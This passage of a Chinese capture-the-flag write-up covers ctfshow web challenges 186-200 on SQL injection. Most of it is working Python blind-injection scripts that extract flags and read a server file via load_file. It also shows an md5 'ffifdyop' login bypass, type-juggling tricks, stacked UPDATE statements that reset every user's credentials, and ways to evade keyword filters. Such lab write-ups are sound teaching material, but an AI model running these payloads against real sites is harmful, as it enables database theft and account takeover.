  <span class="token keyword">return</span> t<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot;)&quot;</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    d <span class="token operator">=</span> convert<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'^ctfshow</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token operator">+</span>j<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    data<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">'tableName'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f' ctfshow_user group by pass having pass regexp(</span><span class="token interpolation"><span class="token punctuation">{</span>d<span class="token punctuation">}</span></span><span class="token string">)'</span></span>
    <span class="token punctuation">}</span>
    <span class="token comment">#print(data)</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token comment">#print(r.text)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;user_count = 1&quot;</span>  <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
      flag<span class="token operator">+=</span>j
      <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
      <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token string">'}'</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h2 id="web-186"><a href="#web-186" class="header-anchor">#</a> web 186</h2> <p>过滤了&lt;&gt;大于小于号，没有影响，上一题脚本还能跑</p> <h2 id="web-187"><a href="#web-187" class="header-anchor">#</a> web 187</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>存在这样一个字符ffifdyop，在php的md5($pwd,true)函数的值是'or'6]!r,b ，可以利用md5值里的or绕过</p> <p>直接登录admin  ffifdyop</p> <p>f12打开开发工具，在网络界面可以看到api接口返回的json数据
{&quot;code&quot;:0,&quot;msg&quot;:&quot;\u767b\u9646\u6210\u529f&quot;,&quot;count&quot;:0,&quot;data&quot;:[{&quot;flag&quot;:&quot;ctfshow{fbe2b5d6-6f77-4396-a89d-f1ed168700ee}&quot;}]}</p> <h2 id="web-188"><a href="#web-188" class="header-anchor">#</a> web 188</h2> <p>username=0,pwd=0登录。f12查看网络接口返响应回json数据</p> <p>在查询语句里，username和传进来的username比较。在mysql里，字符和数字比较时，会把字符转化为0再和数字比较。得到一个0=0的判断，查出所有数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select pass from ctfshow_user where username = {$username}&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在密码验证这里</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//密码判断</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>
      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=&gt;</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>正确密码和整数密码比较，如果正确密码是字符串，那么要和intval($password)比较时也会作为0，那么intval($password)=0时可以绕过验证，所以密码也传0</p> <h2 id="web-189"><a href="#web-189" class="header-anchor">#</a> web 189</h2> <p>读文件盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">&quot;http://9cb4c9e3-266b-448b-9b17-b1ad6e41239b.challenge.ctf.show/api/&quot;</span>
flagstr <span class="token operator">=</span> <span class="token string">&quot;}{&lt;&gt;$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span>

flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token comment">#这个位置，是群主耗费很长时间跑出来的位置~</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;if(substr(load_file('/var/www/html/api/index.php'),{},1)=('{}'),1,0)&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;0&quot;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        <span class="token comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;8d25&quot;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;++++++++++++++++++ {} is right&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag<span class="token operator">+=</span>x
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h2 id="web-190"><a href="#web-190" class="header-anchor">#</a> web 190</h2> <p>给username加上了单引号</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>登录admin，返回密码错误，使用随意用户名返回用户不存在，说明查询成功时会返回密码错误</strong>，利用这点进行盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#author:yu22x</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://46163ae9-ca15-415c-9a1f-d79ea27cf81e.challenge.ctf.show/api/index.php&quot;</span>
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#跑库名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if(ascii(substr(database(),{i},1))={j},1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>

        <span class="token comment">#跑表名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))={j},1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>

        <span class="token comment">#跑列名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))={j},1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>
        <span class="token comment">#跑数据</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;'||if(ascii(substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,1,0)#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>  
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><h2 id="web-191"><a href="#web-191" class="header-anchor">#</a> web 191</h2> <p>过滤了用户名里可能包含的ascll字符串</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>可以使用ord()函数替换ascii()函数</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#author:yu22x</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://f5ac78f2-fd7e-4221-9bf0-d63586ee8a51.challenge.ctf.show/api/index.php&quot;</span>
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#跑库名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if(ord(substr(database(),{i},1))={j},1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>

        <span class="token comment">#跑表名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if(ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))={j},1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>

        <span class="token comment">#跑列名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if(ord(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))={j},1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>
        <span class="token comment">#跑数据</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;'||if(ord(substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,1,0)#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>  
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ascii<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> 
<span class="token number">49</span> 

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> ord<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ord<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
 <span class="token number">49</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="web-192"><a href="#web-192" class="header-anchor">#</a> web 192</h2> <p>禁用了ord,hex函数，换成直接substr()函数跑字符</p> <p>前面没有介绍，这里介绍一下</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>SUBSTR(string, start, length)，每次改变start的位置，length设为1，可以到达每次截取一个字符串的目的进行比较，爆破出字段值</p></div> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://4db5cb12-5119-4ebd-9443-800e9ed3cdd0.challenge.ctf.show/api/&quot;</span>
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'{'</span><span class="token operator">+</span><span class="token string">'}'</span><span class="token operator">+</span><span class="token string">'-'</span>
flag<span class="token operator">=</span><span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;'||if((substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))='</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">',1,0)#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>j  
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="web-193"><a href="#web-193" class="header-anchor">#</a> web 193</h2> <p>禁用了substr函数，可以使用mid()函数</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>MID(string,start,length)函数，功能类似substr函数，用它来每次截取一个，爆破字段值</p></div> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://70fd0050-11ec-4c26-8e1e-5c9ef88ab8b7.challenge.ctf.show/api/&quot;</span>
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'{'</span><span class="token operator">+</span><span class="token string">'}'</span><span class="token operator">+</span><span class="token string">'-'</span>
flag<span class="token operator">=</span><span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>
                <span class="token comment">#跑表名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if((mid((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))='{j}',1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>

        <span class="token comment">#跑列名</span>
        <span class="token comment"># data={</span>
        <span class="token comment">#     'username':f&quot;'||if((mid((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))='{j}',1,0)#&quot;,</span>
        <span class="token comment">#     'password':'1'</span>
        <span class="token comment"># }</span>
        <span class="token comment">#跑数据</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;'||if((mid((select f1ag from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))='</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">',1,0)#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>j  
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><h2 id="web-194"><a href="#web-194" class="header-anchor">#</a> web 194</h2> <p>禁用了left,right函数，那上一题应该是考察left,right函数了</p> <p>left(str,length)</p> <p>left函数从左截取字符串，right函数从右截取字符串</p> <p>这题还是用上题脚本跑了</p> <h2 id="web-195"><a href="#web-195" class="header-anchor">#</a> web 195</h2> <p>堆叠注入，给sql添加上自己的sql语句。过滤了空格和空格的绕过方式，还可以使用圆括号反引号包裹字段名，分号结束语句。通过update语句把用户名密码都修改为1，登录</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token punctuation">(</span>ctfshow_user<span class="token punctuation">)</span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token punctuation">(</span>ctfshow_user<span class="token punctuation">)</span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="web-196"><a href="#web-196" class="header-anchor">#</a> web 196</h2> <p>这题select实际没有过滤</p> <p>题目查询语句</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select pass from ctfshow_user where username = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>;&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>添加下面的sql语句实现堆叠注入后，row[0]=1，此时，$row[0]==$password密码验证时就需要登入密码=1了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-197-200"><a href="#web-197-200" class="header-anchor">#</a> web 197 - 200</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment"># 查询语句</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select pass from ctfshow_user where username = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>;&quot;</span><span class="token punctuation">;</span>
<span class="token comment"># 过滤语句</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
